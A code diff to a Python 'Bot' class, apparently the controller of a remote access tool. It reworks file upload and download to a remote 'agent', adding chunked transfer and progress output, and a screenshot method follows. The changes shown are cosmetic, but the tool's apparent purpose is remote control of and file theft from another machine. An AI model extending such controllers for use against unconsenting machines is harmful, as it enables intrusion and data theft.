@@ -103,52 +103,59 @@ class Bot:
     def upload_file(self, file_data, filename):
         """Upload a file to the agent"""
         try:
-            print(f"[*] Starting upload of {filename} ({len(file_data)} bytes)")
+            file_size = len(file_data)
+            print(f"\n[*] Starting upload of {filename}")
+            print(f"[*] File size: {file_size} bytes")
             
             # Send file size first
             command = {
                 'command': 'upload',
                 'filename': filename,
-                'size': str(len(file_data))
+                'size': str(file_size)
             }
-            print("[*] Sending upload command")
             self.reliable_send(command)
             
             # Wait for ready confirmation
-            print("[*] Waiting for ready confirmation")
             response = self.reliable_recv()
             if not response or not response.get('ready'):
-                print("[!] Agent not ready")
+                print("[-] Agent not ready")
                 return False, "Agent not ready to receive file"
             
             # Send file data
             try:
-                print("[*] Sending file data")
-                self.target.sendall(file_data)
-                print("[*] File data sent")
+                sent = 0
+                chunk_size = 4096
+                while sent < file_size:
+                    chunk = file_data[sent:sent + chunk_size]
+                    self.target.sendall(chunk)
+                    sent += len(chunk)
+                    # Calculate and print progress
+                    progress = (sent / file_size) * 100
+                    print(f"\r[*] Progress: {progress:.1f}% ({sent}/{file_size} bytes)", end='')
+                
+                print("\n[+] File data sent")
             except Exception as e:
-                print(f"[!] Error sending file data: {e}")
+                print(f"\n[-] Error sending file data: {e}")
                 return False, f"Error sending file data: {str(e)}"
             
             # Get upload confirmation
-            print("[*] Waiting for upload confirmation")
             response = self.reliable_recv()
             if response and response.get('success'):
-                print("[*] Upload successful")
+                print("[+] Upload successful")
                 return True, f"File {filename} uploaded successfully"
             else:
                 error = response.get('error', 'Upload failed') if response else 'No confirmation received'
-                print(f"[!] Upload failed: {error}")
+                print(f"[-] Upload failed: {error}")
                 return False, error
             
         except Exception as e:
-            print(f"[!] Upload error: {e}")
+            print(f"[-] Upload error: {e}")
             return False, f"Upload error: {str(e)}"
 
     def download_file(self, filename):
         """Download a file from the agent"""
         try:
-            print(f"[*] Starting download of {filename}")
+            print(f"\n[*] Requesting download of {filename}")
             
             # Request file download
             self.reliable_send({
@@ -157,29 +164,27 @@ class Bot:
             })
             
             # Get initial response with file size or error
-            print("[*] Waiting for file size")
             response = self.reliable_recv()
             if not response:
-                print("[!] No response from agent")
+                print("[-] No response from agent")
                 return False, "No response from agent", None
             
             if response.get('error'):
-                print(f"[!] Agent error: {response['error']}")
+                print(f"[-] Agent error: {response['error']}")
                 return False, response['error'], None
             
             try:
                 file_size = int(response.get('size', 0))
                 print(f"[*] File size: {file_size} bytes")
             except (ValueError, TypeError):
-                print("[!] Invalid file size received")
+                print("[-] Invalid file size received")
                 return False, "Invalid file size received", None
             
             if file_size == 0:
-                print("[!] Empty file")
+                print("[-] Empty file")
                 return False, "Empty file size received", None
             
             # Receive file data
-            print("[*] Receiving file data")
             received_data = b''
             remaining = file_size
             
@@ -190,20 +195,25 @@ class Bot:
                         break
                     received_data += chunk
                     remaining -= len(chunk)
-                    print(f"[*] Received: {len(received_data)}/{file_size} bytes")
+                    # Calculate and print progress
+                    progress = ((file_size - remaining) / file_size) * 100
+                    print(f"\r[*] Progress: {progress:.1f}% ({len(received_data)}/{file_size} bytes)", end='')
+                
+                print()  # New line after progress
+                
             except Exception as e:
-                print(f"[!] Error receiving file data: {e}")
+                print(f"\n[-] Error receiving file data: {e}")
                 return False, f"Error receiving file data: {str(e)}", None
             
             if len(received_data) == file_size:
-                print("[*] Download successful")
+                print("[+] Download successful")
                 return True, f"File {filename} downloaded successfully", received_data
             else:
-                print("[!] Download incomplete")
+                print("\n[-] Download incomplete")
                 return False, "Download incomplete", None
             
         except Exception as e:
-            print(f"[!] Download error: {e}")
+            print(f"[-] Download error: {e}")
             return False, f"Download error: {str(e)}", None
 
     def screenshot(self, count):
